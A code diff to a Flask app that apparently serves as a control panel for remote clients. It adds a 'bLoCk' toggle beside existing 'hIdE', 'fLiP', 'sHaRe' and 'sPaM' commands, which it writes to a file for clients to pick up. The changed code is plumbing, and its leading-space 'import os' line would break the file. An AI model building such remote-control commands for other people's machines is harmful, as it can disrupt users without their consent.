@@ -1,4 +1,4 @@
-import os
+ import os
 from time import time
 from flask import Flask, render_template, request, redirect, jsonify, Response
 from datetime import datetime
@@ -42,7 +42,11 @@ with open(state_file,"w") as file:
             "shareToggleState": {
             	"state": "off",
             	"color": "red"
-            }
+            },
+            "INToggleState": {
+            	"state": "off",
+            	"color": "red"
+            } 
         }
     json.dump(states, file, indent=4)			
 @app.route("/")
@@ -68,6 +72,8 @@ def terminal():
     fc = data1[selected_user]["flipToggleState"]["color"]
     shs = data1[selected_user]["shareToggleState"]["state"]
     shc = data1[selected_user]["shareToggleState"]["color"]
+    is1 = data1[selected_user]["INToggleState"]["state"]
+    ic = data1[selected_user]["INToggleState"]["color"]
     if not firstReload:
         if time() - startTime <= 2.5:
             state = "Online"
@@ -81,7 +87,7 @@ def terminal():
     else:
         data = {"tasks": []}
     firstReload = False       
-    return render_template("index.html", state=state if state else "Offline", files=files, tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,fs=fs,fc=fc,shc=shc,shs=shs,users=users,selected = selected)
+    return render_template("index.html", state=state if state else "Offline", files=files, tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,fs=fs,fc=fc,shc=shc,shs=shs,is1=is1,ic=ic,users=users,selected = selected)
 
 @app.route("/edit", methods=["POST", "GET"])
 def edit():
@@ -285,10 +291,13 @@ def toggle():
             elif cmd == "sHaRe":
                 data[selected_user]["shareToggleState"]["state"] = state
                 data[selected_user]["shareToggleState"]["color"] = color
+            elif cmd == "bLoCk":
+                data[selected_user]["INToggleState"]["state"] = state
+                data[selected_user]["INToggleState"]["color"] = color            
             with open(state_file, "w") as file:
                 json.dump(data, file, indent=4)
         
-        if cmd == "hIdE" or cmd == "fLiP" or cmd == "sHaRe":
+        if cmd == "hIdE" or cmd == "fLiP" or cmd == "sHaRe" or cmd == "bLoCk":
             with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
                 file.write(f"{cmd} {state}")
         elif cmd == "sPaM":
